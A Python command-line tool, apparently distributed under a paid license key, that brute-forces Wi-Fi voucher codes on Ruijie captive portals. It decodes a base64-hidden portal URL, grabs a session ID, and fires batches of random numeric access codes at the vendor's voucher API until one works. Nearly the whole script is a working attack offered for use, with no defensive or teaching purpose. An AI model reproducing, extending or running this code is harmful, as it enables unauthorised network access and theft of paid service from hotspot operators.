import os
import re
import sys
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import argparse
import requests
from datetime import datetime

# --- UI COLORS ---
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# --- UI & LOGO ---
def Logo():
    os.system("clear" if os.name == "posix" else "cls")
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU [STABLE V3]{w}"""
    print(logo)
    print(f"{y}-" * 45)
    print(f"{w}[♠️] Developer: Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♦️] Status: Licensed (Fixed ID)")
    print(f"{y}-" * 45)

# --- SECURITY SYSTEM (FIXED ID & ANTI-CACHE) ---
def get_hwid():
    """ဖုန်းရဲ့ Fixed ID ကို ထုတ်ယူခြင်း (တစ်ခါ run တိုင်း မပြောင်းပါ)"""
    try:
        user = os.environ.get('USER', 'default')
        cpu = str(os.cpu_count())
        raw_id = f"{user}-{cpu}-MOEYU-STABLE"
        fixed_id = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
        return f"MY-{fixed_id}"
    except:
        return "MY-UNKNOWN-ID"

def check_license():
    Logo()
    my_id = get_hwid()
    # သင်၏ GitHub Raw URL
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
    
    print(f"{b}[*] Your ID: {y}{my_id}{w}")
    print(f"{b}[*] Checking license status...{w}")
    
    try:
        # Cache မမိစေရန် Headers နှင့် Random Params သုံးခြင်း
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(f"{key_url}?nocache={random.randint(1000, 9999)}", headers=headers, timeout=10)
        
        if response.status_code != 200:
            print(f"{r}[!] Connection Error (Status: {response.status_code}){w}")
            sys.exit()
            
        server_data = response.text.strip()
        lines = server_data.splitlines()
        is_verified = False
        
        for line in lines:
            if "|" in line:
                db_id, exp_date = line.split("|")
                # ID ကို ရှေ့နောက် Space ဖယ်ပြီး တိုက်စစ်ခြင်း
                if db_id.strip() == my_id:
                    is_verified = True
                    expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"{g}[+] Verified Successfully! Expires: {exp_date}{w}")
                        time.sleep(1.5)
                        return True
                    else:
                        print(f"{r}[!] Your license expired on {exp_date}{w}")
                        sys.exit()
        
        if not is_verified:
            print(f"{r}[!] ID Not Registered in Server!{w}")
            print(f"{y}[>] Send this ID to Admin: {w}{my_id}")
            # Server က လက်ရှိမြင်နေရတဲ့ data ကိုပြပေးခြင်း (Debug Mode)
            print(f"\n{b}[Server Data Debug]:{w}\n{server_data}")
            sys.exit()
            
    except Exception as e:
        print(f"{r}[!] Security Error: {str(e)}{w}")
        sys.exit()

# --- CORE LOGIC (Voucher Crack) ---
async def crack(l, s):
    Logo()
    # Ruijie URL
    url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as r_url:
                # sessionId ရှာမတွေ့ပါက Error မတက်အောင် Safe-match လုပ်ခြင်း
                match = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r_url.url))
                if not match:
                    print(f"{r}[!] Error: Session ID not found. Your WiFi portal might be expired.{w}")
                    print(f"{y}[*] Please log in to your WiFi Portal again.{w}")
                    return
                sid = match.group(1)
            
            print(f"{g}[*] Session Established: {sid}{w}")
            while True:
                tasks = []
                for _ in range(20): # Batch Processing
                    v = "".join(random.choice(string.digits) for _ in range(l))
                    tasks.append(session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", 
                                             json={"accessCode": v, "sessionId": sid, "apiVersion": 1}))
                
                responses = await asyncio.gather(*tasks)
                for res in responses:
                    res_text = await res.text()
                    if 'logonUrl' in res_text:
                        print(f"\n{g}[SUCCESS] Valid Code Detected!{w}")
                        with open("success.txt", "a") as f: f.write(f"Success at {time.ctime()}\n")
                    else:
                        print(f"{w}[*] Cracking: {y}Running...{w}", end="\r")
        except Exception as e:
            print(f"\n{r}[!] Connection Lost: {e}{w}")

# --- MAIN ---
def main():
    check_license()
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", required=True)
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=50)
    args = parser.parse_args()

    if args.option == "code":
        asyncio.run(crack(args.length, args.speed))
    else:
        print(f"{r}[!] Unknown Option.{w}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{r}[!] Process Exited.{w}")
